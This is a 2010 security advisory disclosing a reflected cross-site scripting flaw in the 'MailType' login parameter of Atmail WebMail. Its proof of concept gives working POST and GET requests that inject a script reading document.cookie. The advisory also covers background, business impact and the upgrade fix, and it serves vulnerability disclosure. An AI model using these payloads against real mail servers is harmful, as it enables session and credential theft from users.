INTERNET SECURITY AUDITORS ALERT 2010-009
- Original release date: August 30th, 2010
- Last revised:  September 21st, 2010
- Discovered by: Vicente Aguilera Diaz
- Severity: 4.3/10 (CVSSv2 Base Scored)
=============================================

I. VULNERABILITY
-------------------------
Reflected XSS in the login process of the Atmail WebMail < v6.1.9

II. BACKGROUND
-------------------------
Atmail allows users to access IMAP Mailboxes of any server of your
choice. The software provides a comprehensive email-suite for
accessing user mailboxes, and provides an inbuilt Calendar and
Addressbook features. The WebMail Client of Atmail supports any
existing IMAP server running under Unix/Linux or Windows systems.

III. DESCRIPTION
-------------------------
Has been detected a reflected XSS vulnerability in the login process
of the Atmail WebMail, that allows the execution of arbitrary
HTML/script code to be executed in the context of the victim user's
browser.

The code injection is done through the "MailType" parameter, and can
be exploited without a user account in the WebMail.

Moreover, the login request may be made by the HTTP GET method (by
default, HTTP POST method is used), so this facilitates the
exploitation of the vulnerability.

IV. PROOF OF CONCEPT
-------------------------
=== Original request:
POST /index.php/mail/auth/processlogin HTTP/1.1
Host: <atmail_host>
...

emailName=<emailName>&emailDomain=<emailDomain>&cssStyle=original&email=<email>password=<password>&requestedServer=&MailType=IMAP

=== Malicious request - Example 1:
POST /index.php/mail/auth/processlogin HTTP/1.1
Host: <atmail_host>
...

emailName=<emailName>&emailDomain=<emailDomain>&cssStyle=original&email=<email>password=<password>&requestedServer=&MailType=<script>alert(document.cookie);</script>

=== Malicious request - Example 2:
GET
/index.php/mail/auth/processlogin?emailName=<emailName>&emailDomain=<emailDomain>&cssStyle=original&email=<email>password=<password>&requestedServer=&MailType=<script>alert(document.cookie);</script>
HTTP/1.1

V. BUSINESS IMPACT
-------------------------
An attacker can execute arbitrary HTML or script code in a targeted
user's browser, this can leverage to steal sensitive information as
user credentials, personal data, etc.

VI. SYSTEMS AFFECTED
-------------------------
Tested in Atmail 6.1.9. Other versions may be affected too.

VII. SOLUTION
-------------------------
Upgrade to version 6.2.0
